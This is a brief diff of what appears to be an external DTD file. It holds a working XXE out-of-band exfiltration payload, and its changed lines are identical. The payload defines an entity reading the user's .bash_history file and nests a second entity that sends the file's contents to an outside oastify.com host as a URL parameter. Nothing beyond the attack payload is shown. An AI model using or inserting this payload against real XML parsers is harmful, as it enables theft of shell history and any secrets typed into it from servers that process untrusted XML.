@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///home/$USER/.bash_history">
+<!ENTITY % file SYSTEM "file:///home/$USER/.bash_history">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://vut1v00ks842015ozs8eyj2tokudi46t.oastify.com/?x=%file;'>">
 %eval;
 %exfiltrate;
